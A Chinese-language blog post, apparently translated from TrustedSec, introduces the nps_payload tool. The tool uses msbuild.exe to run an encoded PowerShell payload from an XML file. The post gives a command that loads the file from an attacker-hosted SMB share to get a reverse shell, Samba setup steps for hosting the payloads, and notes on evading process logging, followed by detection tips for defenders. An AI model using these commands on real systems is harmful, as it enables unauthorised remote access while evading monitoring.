---
title: Nop-Payload
date: 2017-07-30 20:12:35
tags: Metasploit
categories: Metasploit
---
![enter description here][1]
<!--more-->
 ## 视频演示：
<div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div>
<script type="text/javascript" src="http://demonsec666.oss-cn-qingdao.aliyuncs.com/cytron.core.js"></script>
<script>
    var ivaInstance = new Iva('ivaLive', {
        appkey: 'By9WGzBIx', //应用标示
        video: 'http://demonsec666.oss-cn-qingdao.aliyuncs.com/nop-payload.mp4', //视频
        title: 'test', //视频标题，后台视频管理中的标题
        cover: '' //视频封面，只有在autoplay:false才可生效
    });
</script>
<script src="http://demonsec666.oss-cn-qingdao.aliyuncs.com/lva.js"></script>

新工具发布：NPS_Payload

在过去一年中，我们看到了大量的研究成果，其中强调了Microsoft的本机二进制文件，这些二进制文件可以被攻击者利用来妥协或获取系统访问权限。这些二进制文件之一msbuild.exe已被证明是非常可靠的，允许我们在后处理场景中在主机上获取shell。

Casey Smith（@subtee）撰写了几篇关于如何使用msbuild.exe从.csproj或.xml文件执行代码的文章。Casey发现有几个部分允许有人添加任何想要的代码，当msbuild.exe分析文件时，它将执行这些代码块。这允许一个人将任何C＃代码添加到csproj或xml文件中。

两个TrustedSec团队成员Larry Spohn和Ben Mauch决定将Ben的“不PowerShell”（NPS）和Dave Kennedy的独角兽和Casey的示例一起进行了一些功能的混合，并提出了一个新的工具称为nps_payload。
&nbsp;
![enter description here][2]
&nbsp;
此工具提供了一种生成将被插入到msbuild_nps.xml文件中的PowerShell有效负载的方法，并且当msbuild.exe运行文件时将使用nps来执行有效负载。类似于Dave Kennedy的独角兽，nps_payload还提供了一个Metasploit控制台资源（msbuild_nps.rc）文件。
&nbsp;
![enter description here][3]
&nbsp;
有两种方法可以部署msbuild_nps.xml文件。第一个是将msbuild_nps.xml文件复制到远程主机，然后使用以下命令执行。

C：\ Windows \ Microsoft.NET \ Framework \ v4.0.30319 \ msbuild.exe C：\ <path_to_msbuild_nps.xml>

第二种方法是在SMB共享上托管msbuild_nps.xml文件，并使用UNC路径与msbuild.exe命令指向xml文件。

C：\ Windows \ Microsoft.NET \ Framework \ v4.0.30319 \ msbuild.exe \\ <attacker_ip> \ <share> \ msbuild_nps.xml

这将使用nps运行编码的PowerShell有效载荷，并将返回一个shell到攻击者。一旦攻击者迁移到新进程，msbuild.exe将退出。重要的是要注意，nps执行PowerShell代码而不调用powershell.exe，不会显示在事件ID 4688（新建进程）中。

对于Defenders，您可以通过监视任何调用msbuild.exe的事件ID 4688事件来检测此攻击，然后检查任何对UNC或本地文件的引用的命令行参数。您还可以启用PowerShell日志记录并监视事件ID 4104事件，并查找已编码的任何PowerShell代码。

github :www.github.com/trustedsec/nps_payload
https://www.trustedsec.com/2017/07/new-tool-release-nps_payload/


## 安装部分
<pre>
pip install -r requirements.txt
apt-get install samba 
vi / nano / whatever /etc/samba/smb.conf 3.）将以下内容添加到文件的底部（酌情更改）
[payloads$] 
comment = Dirty Payloads
path = /opt/shares/payloads 
browsable = yes
guest ok = yes 
read only = yes

 service smbd restart
 </pre>
 接下来 看视频如何操作演示的吧！！


  [1]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/B47A30EF9D6D80AB3A6721846F343D42.png
  [2]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/nps_payload_1.png 
  [3]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/nps_payload_2.png 